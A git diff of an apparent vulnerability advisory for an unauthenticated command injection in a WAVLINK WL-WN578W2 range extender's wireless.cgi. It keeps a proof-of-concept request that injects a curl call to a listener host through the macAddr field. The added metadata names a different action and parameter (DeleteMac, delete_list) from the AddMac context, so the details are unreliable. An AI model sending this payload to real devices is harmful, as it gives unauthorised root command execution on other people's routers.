@@ -22,17 +22,25 @@ An unauthenticated command injection vulnerability exists in the `AddMac` action
 
 *   **Vendor**: WAVLINK
 
-*   **Product**: WL-WN578W2 (wireless range extender)
+*   **Vendor Website**: [https://www.wavlink.com/zh\_cn/index.html](https://www.wavlink.com/zh_cn/index.html)
+
+*   **Product**: WAVLINK WL-WN578W2 (wireless range extender)
 
 *   **Firmware**: M78W2\_V221110
 
-*   **Endpoint**: `/cgi-bin/wireless.cgi` (POST, `page=AddMac`)
+*   **Firmware Download**: [https://docs.wavlink.xyz/Firmware\_ch/fm-578w2/](https://docs.wavlink.xyz/Firmware_ch/fm-578w2/)
 
-*   **Vulnerable Parameter**: `macAddr`
+*   **Affected Endpoint**: `/cgi-bin/wireless.cgi` (POST method, no login required)
 
-*   **Type**: Unauthenticated Command Injection
+*   **Trigger Condition**: Request parameter `page=DeleteMac`
 
-*   **Impact**: Execute arbitrary `root` commands (exfiltrate data, plant backdoors) without credentials
+*   **Vulnerable Parameter**: `delete_list`
+
+*   **Vulnerability Type**: Unauthenticated Command Injection
+
+*   **CVE ID**: Pending
+
+*   **Impact**: Execute commands
 
 *   **Reported by**: n0ps1ed (n0ps1edzz@gmail.com)
 
@@ -102,3 +110,4 @@ page=AddMac&addMac=&addName=&macAddr=;curl http://192.168.10.154:1234
 
 Netcat receives request from device, confirming command injection success:
 ![Netcat Listener](./imgs/4.png)
+
